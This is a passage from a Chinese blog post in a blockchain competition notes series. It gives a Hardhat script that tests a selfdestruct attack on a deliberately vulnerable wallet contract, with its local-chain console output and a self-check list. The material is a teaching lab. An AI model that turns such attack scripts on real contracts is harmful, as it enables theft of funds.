+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">debugTest</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🔍 调试自毁攻击...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [owner, attacker] = <span class="keyword">await</span> ethers.<span class="title function_">getSigners</span>();</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;所有者:&quot;</span>, owner.<span class="property">address</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;攻击者:&quot;</span>, attacker.<span class="property">address</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 部署钱包合约</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">VulnerableWallet</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;VulnerableWallet&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> wallet = <span class="keyword">await</span> <span class="title class_">VulnerableWallet</span>.<span class="title function_">deploy</span>();</span><br><span class="line">  <span class="keyword">const</span> walletAddress = <span class="keyword">await</span> wallet.<span class="title function_">getAddress</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;💰 钱包合约:&quot;</span>, walletAddress);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查初始代码</span></span><br><span class="line">  <span class="keyword">const</span> initialCode = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getCode</span>(walletAddress);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;📄 初始合约代码长度:&quot;</span>, initialCode.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 测试存款</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n💸 测试存款...&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> depositTx = <span class="keyword">await</span> wallet.<span class="title function_">deposit</span>(&#123; <span class="attr">value</span>: ethers.<span class="title function_">parseEther</span>(<span class="string">&quot;1.0&quot;</span>) &#125;);</span><br><span class="line">  <span class="keyword">await</span> depositTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [ownerAddr, balance, contractBalance] = <span class="keyword">await</span> wallet.<span class="title function_">getInfo</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  所有者:&quot;</span>, ownerAddr);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  内部余额:&quot;</span>, ethers.<span class="title function_">formatEther</span>(balance), <span class="string">&quot;ETH&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  合约余额:&quot;</span>, ethers.<span class="title function_">formatEther</span>(contractBalance), <span class="string">&quot;ETH&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 测试自毁</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n💥 执行自毁...&quot;</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> destroyTx = <span class="keyword">await</span> wallet.<span class="title function_">destroy</span>();</span><br><span class="line">    <span class="keyword">const</span> receipt = <span class="keyword">await</span> destroyTx.<span class="title function_">wait</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  ✅ 自毁交易成功&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  交易哈希:&quot;</span>, receipt.<span class="property">hash</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  区块号:&quot;</span>, receipt.<span class="property">blockNumber</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待区块确认</span></span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">2000</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证代码被删除</span></span><br><span class="line">    <span class="keyword">const</span> finalCode = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getCode</span>(walletAddress);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;📄 自毁后合约代码长度:&quot;</span>, finalCode.<span class="property">length</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  代码是否被删除:&quot;</span>, finalCode === <span class="string">&quot;0x&quot;</span> ? <span class="string">&quot;✅ 是&quot;</span> : <span class="string">&quot;❌ 否&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (finalCode !== <span class="string">&quot;0x&quot;</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;⚠️  警告: 合约代码未被删除!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;❌ 自毁失败:&quot;</span>, error.<span class="property">message</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 测试攻击合约</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n🔫 测试攻击合约...&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">SelfDestructAttack</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;SelfDestructAttack&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> attack = <span class="keyword">await</span> <span class="title class_">SelfDestructAttack</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">deploy</span>();</span><br><span class="line">  <span class="keyword">const</span> attackAddress = <span class="keyword">await</span> attack.<span class="title function_">getAddress</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;🎯 攻击合约:&quot;</span>, attackAddress);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查攻击合约代码</span></span><br><span class="line">  <span class="keyword">const</span> attackCode = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getCode</span>(attackAddress);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;📄 攻击合约代码长度:&quot;</span>, attackCode.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 测试攻击合约自毁</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n💣 执行攻击合约自毁...&quot;</span>);</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> attackTx = <span class="keyword">await</span> attack.<span class="title function_">connect</span>(attacker).<span class="title function_">attack</span>(walletAddress, &#123; <span class="attr">value</span>: ethers.<span class="title function_">parseEther</span>(<span class="string">&quot;0.1&quot;</span>) &#125;);</span><br><span class="line">    <span class="keyword">const</span> attackReceipt = <span class="keyword">await</span> attackTx.<span class="title function_">wait</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  ✅ 攻击交易成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查攻击合约是否自毁</span></span><br><span class="line">    <span class="keyword">const</span> attackCodeAfter = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getCode</span>(attackAddress);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;📄 攻击后攻击合约代码长度:&quot;</span>, attackCodeAfter.<span class="property">length</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  攻击合约是否自毁:&quot;</span>, attackCodeAfter === <span class="string">&quot;0x&quot;</span> ? <span class="string">&quot;✅ 是&quot;</span> : <span class="string">&quot;❌ 否&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;❌ 攻击失败:&quot;</span>, error.<span class="property">message</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">debugTest</span>().<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">error</span>);</span><br></pre></td></tr></table></figure>
+
+<p>测试结果</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> E:\code\solidity_project\vulnerability_test_5&gt; pnpm hardhat run scripts/<span class="built_in">deploy-selfdestruct</span>.js <span class="literal">--network</span> localhost</span><br><span class="line">🚀 部署自毁攻击演示合约...</span><br><span class="line">部署者地址: <span class="number">0</span>xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266</span><br><span class="line">✅ VulnerableWallet 部署: <span class="number">0</span>x5FbDB2315678afecb367f032d93F642f64180aa3</span><br><span class="line">✅ BalanceDependent 部署: <span class="number">0</span>xe7f1725E7734CE288F8367e1Bb143E90bb3F0512</span><br><span class="line">✅ SelfDestructAttack 部署: <span class="number">0</span>x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0</span><br><span class="line">✅ SafeWallet 部署: <span class="number">0</span>xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9</span><br><span class="line"></span><br><span class="line">🎉 所有合约部署完成!</span><br><span class="line"></span><br><span class="line">📋 测试命令:</span><br><span class="line">   pnpm hardhat test test/selfdestruct<span class="literal">-attack</span>.test.js</span><br><span class="line"><span class="built_in">PS</span> E:\code\solidity_project\vulnerability_test_5&gt; pnpm hardhat run scripts/quick<span class="literal">-test</span>.js</span><br><span class="line">🚀 快速测试自毁攻击...</span><br><span class="line">钱包合约: <span class="number">0</span>x5FbDB2315678afecb367f032d93F642f64180aa3</span><br><span class="line">攻击合约: <span class="number">0</span>x8464135c8F25Da09e49BC8782676a84730C318bC</span><br><span class="line">存款成功</span><br><span class="line">自毁成功</span><br><span class="line">合约代码: 存在</span><br><span class="line"><span class="built_in">PS</span> E:\code\solidity_project\vulnerability_test_5&gt; pnpm hardhat run scripts/quick<span class="literal">-test</span>.js</span><br><span class="line">🔍 调试自毁攻击...</span><br><span class="line">所有者: <span class="number">0</span>xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266</span><br><span class="line">攻击者: <span class="number">0</span>x70997970C51812dc3A010C7d01b50e0d17dc79C8</span><br><span class="line">💰 钱包合约: <span class="number">0</span>x5FbDB2315678afecb367f032d93F642f64180aa3</span><br><span class="line">📄 初始合约代码长度: <span class="number">4820</span></span><br><span class="line"></span><br><span class="line">💸 测试存款...</span><br><span class="line">  所有者: <span class="number">0</span>xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266</span><br><span class="line">  内部余额: <span class="number">1.0</span> ETH</span><br><span class="line">  合约余额: <span class="number">1.0</span> ETH</span><br><span class="line"></span><br><span class="line">💥 执行自毁...</span><br><span class="line">  ✅ 自毁交易成功</span><br><span class="line">  交易哈希: <span class="number">0</span>x854e44446cc1e1aa3f21e52852e0597ae58b881aa0593576a8657998d56d0cbe</span><br><span class="line">  区块号: <span class="number">3</span></span><br><span class="line">📄 自毁后合约代码长度: <span class="number">4820</span></span><br><span class="line">  代码是否被删除: ❌ 否</span><br><span class="line">⚠️  警告: 合约代码未被删除!</span><br><span class="line"></span><br><span class="line">🔫 测试攻击合约...</span><br><span class="line">🎯 攻击合约: <span class="number">0</span>x8464135c8F25Da09e49BC8782676a84730C318bC</span><br><span class="line">📄 攻击合约代码长度: <span class="number">3926</span></span><br><span class="line"></span><br><span class="line">💣 执行攻击合约自毁...</span><br><span class="line">  ✅ 攻击交易成功</span><br><span class="line">📄 攻击后攻击合约代码长度: <span class="number">3926</span></span><br><span class="line">  攻击合约是否自毁: ❌ 否</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现时的自查"><a href="#复现时的自查" class="headerlink" title="复现时的自查"></a>复现时的自查</h2><ul>
+<li>记录自己实际使用的版本、配置和缺失依赖。</li>
+<li>对照本篇关键步骤，保存命令或调用结果，并解释结果代表什么。</li>
+<li>对失败或与原记录不一致的情况保留错误信息，不把历史输出当成自己的验证结果。</li>
+</ul>
+<p><a href="/guosai-notes/">返回系列导读</a> · <a href="/guosai-notes/security-replay/">上一篇</a> · <a href="/guosai-notes/ops/">下一篇</a></p>
+
+                <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+                <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                    <source type="audio/mpeg" src="">
+                </audio>
+                
+                <ul id="audio-list" style="display:none">
+                    
+                    
+                    <li title="0" data-url="https://blog.curesky.site/audio/yinlang.mp3"></li>
+                    
+                    
+                </ul>
+                
+            </div>
+
+            
+<section class="f-copyright">
+    <div class="f-copy-main">
+        <p class="f-copy-title">本文作者 <b>Allureluoli</b></p>
+        <p class="f-copy-text">文字版权归作者所有，转载请注明出处；商业用途请先联系二月。</p>
+    </div>
+    <div class="f-copy-side">
+        <span>CC BY-NC-ND 4.0</span>
+        <a href="/guosai-notes/security-selfdestruct/" target="_blank" rel="noopener">原文链接 ↗</a>
+    </div>
+</section>
+
+
+<nav class="f-pn" aria-label="上一篇 / 下一篇">
+    
+    <a class="f-pn-card f-pn-prev" href="/guosai-notes/security-replay/">
+        <span class="f-pn-label">← 更新的文章</span>
+        <span class="f-pn-title">区块链国赛笔记 22｜合约安全实验：签名重放与防护思路</span>
+        <span class="f-pn-date">2026-11-03</span>
+    </a>
+    
+    
+    <a class="f-pn-card f-pn-next" href="/guosai-notes/security-reentrancy/">
+        <span class="f-pn-label">更早的文章 →</span>
+        <span class="f-pn-title">区块链国赛笔记 19｜合约安全实验：重入攻击与测试记录</span>
+        <span class="f-pn-date">2026-11-03</span>
+    </a>
+    
+</nav>
+
+
+<div class="f-comments">
+    <p class="f-comments-title">评论<em>COMMENTS</em></p>
+    
+<div id="gitalk-container" class="comment link"
+    data-enable="true"
+    data-ae="true"
+    data-ci="10a7f71656553fd4676c"
+    data-cs="48f8d183288b4d0b2531f047719dee43bdc913ec"
+    data-r="allureluoli.github.io"
+    data-o="allureluoli"
+    data-a="allureluoli"
+    data-d="false"
+>查看评论 · 基于 GitHub Issues</div>
+
+
+</div>
+
+        </article>
+
+        <aside class="f-post-aside">
+            
+            <div class="f-toc-card" id="f-toc-card">
+                <p class="f-toc-title">目录<em>CONTENTS</em></p>
+                <div class="f-toc-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%85%E8%AF%BB%E5%89%8D%E5%85%88%E7%A1%AE%E8%AE%A4"><span class="toc-text">阅读前先确认</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-3%E9%A2%98-%E8%87%AA%E6%AF%81%E4%B8%93%E9%A1%B9"><span class="toc-text">第二部分 3题 - 自毁专项</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%9A%84%E4%BB%A3%E7%A0%81"><span class="toc-text">测试的代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%97%B6%E7%9A%84%E8%87%AA%E6%9F%A5"><span class="toc-text">复现时的自查</span></a></li></ol></div>
+            </div>
+            
+        </aside>
+    </div>
+</div>
+
+
+    
+<footer class="f-footer">
+    <span class="f-footer-glow" aria-hidden="true"></span>
+    <div class="f-footer-inner">
+        <a class="f-footer-brand" href="/">
+            <img class="f-footer-avatar" src="/img/avatar.jpg" alt="Allureluoli" width="34" height="34">
+            <span>二月の档案室<em>FEBRUARY · ARCHIVE</em></span>
+        </a>
+
+        <p class="f-footer-quote">
+            <span class="f-footer-quote-zh">我不相信命运，且我将在醉生梦死中追寻真正的自我。</span>
+            <span class="f-footer-quote-en">I do not believe in fate. In wine and dreams, I will seek out my true self.</span>
+        </p>
+
+        <div class="f-footer-links">
+            
+            <a href="https://x.com/DevilC1875" target="_blank" rel="noopener">X</a>
+            
+            <a href="https://github.com/allureluoli/" target="_blank" rel="noopener">GitHub</a>
+            
+            <a href="weixin://dl/chat?moonfebruarymoon" target="_blank" rel="noopener">微信</a>
+            
+            <a href="mailto:3345483363@qq.com" target="_blank" rel="noopener">Email</a>
+            
+            <a href="/atom.xml">RSS</a>
+        </div>
+
+        <p class="f-footer-meta">
+            &copy; 2026 Allureluoli · Powered by Hexo · Theme Diaspora · 魔改 by 二月
+        </p>
+
+        
+        <p class="f-footer-beian">
+            <a rel="nofollow" href="https://www.baidu.com/s?wd=为什么有的网站没有备案" target="_blank">为什么呢</a>
+        </p>
+        
+    </div>
+</footer>
+
+
+    <button class="f-totop" id="f-totop" type="button" aria-label="回到顶部">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 19V5M5 12l7-7 7 7" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </button>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/february.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
